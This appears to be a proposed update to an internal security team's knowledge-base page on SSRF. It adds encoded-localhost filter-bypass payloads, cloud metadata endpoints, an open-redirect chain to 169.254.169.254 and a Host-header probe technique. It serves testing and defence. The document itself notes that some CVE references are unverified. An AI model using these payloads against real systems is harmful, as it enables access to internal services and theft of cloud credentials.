# PROPOSAL (proposal) for docs/knowledge/class-ssrf.md — kb-enrich 2026-08-16
_Review and apply manually; not auto-merged into the KB._

## Concrete encoding-bypass payloads (added 2026-08-16, supplements the "assume don't enumerate" section)

The filter-bypass *class* (validator/client parsing mismatch) is already documented; these are
copy-paste-ready payloads for the same underlying bug when a quick manual probe is warranted:
- Decimal IP: `http://2130706433/` (=127.0.0.1)
- Octal IP: `http://017700000001/`
- Hex IP: `http://0x7f.0x0.0x0.0x1/`
- Short-form IPv4: `http://127.1/`
- IPv4-mapped IPv6: `http://[::ffff:127.0.0.1]/`
- Userinfo splitting: `http://expected-allowed-host:fake@internal-target/`
- Fragment confusion: `http://internal-target#expected-allowed-host`
- Subdomain suffix-match bypass: `http://expected-allowed-host.internal-target/` (defeats naive `endsWith()` checks)

## Additional cloud-metadata endpoints (extends the multi-cloud table)
- **Alibaba Cloud:** `http://100.100.100.200/latest/meta-data/` — different link-local IP than
  AWS/GCP/Azure (169.254.169.254), worth probing separately since a blocklist keyed only on
  169.254.169.254 misses it entirely.
- **Oracle Cloud:** `http://169.254.169.254/opc/v2/instance/` — header-gated (`Authorization: Bearer Oracle`).
- **DigitalOcean:** `http://169.254.169.254/metadata/v1/` — **no header gate**, meaning a pure
  GET-only SSRF sink (no header control needed) can read it directly — worth prioritizing over
  AWS/GCP/Azure targets when the sink can't do custom headers.

## Open-redirect → metadata chaining
When a URL-fetch sink validates only the *first* hop's host against an allowlist, a redirect
chain through an allowed host to `169.254.169.254` can reach metadata even with correct
allowlist validation — IF the fetcher follows redirects. Pattern:
`?url=https://allowed.example.com/redirect?to=http://169.254.169.254/latest/meta-data/`
Only relevant if the sink follows 3xx; confirms the same interactsh OOB primitive either way —
point the *redirect target*, not just the initial param, at the canary when testing a sink that
follows redirects.

## Distinct gadget: forged Host header trusted for server-side proxying (framework-level, not classic `?url=`)
A newer pattern separate from our "sinks beyond `?url=`" list: some frameworks (seen in Next.js
Server Actions / route-resolution SSRF reports, verify exact CVE before citing) treat the
client-supplied `Host` header as authoritative when the server itself makes a subsequent
same-origin-relative fetch (e.g. resolving `next/image`, revalidation, or an internal API proxy
step) — no visible URL param at all, the forgery is purely the `Host:` header on the *original*
request. Worth a differential probe on any Next.js/framework target that does server-side
image optimization or ISR/revalidation: send the normal request then repeat with a canary `Host:`
header and watch interactsh for a callback.

⚠️ Verify before citing: Craft CMS CVE-2026-27127 (may be a renumbering of our existing
GHSA-gp2f-7wcm-5fhx entry — reconcile), Next.js CVE-2024-34351 / CVE-2025-57822, Pandoc
CVE-2025-51591 — all sourced from a secondary aggregator, not NVD/vendor advisories.

Source: [vulnsy.com SSRF cheat sheet](https://www.vulnsy.com/cheat-sheets/ssrf)
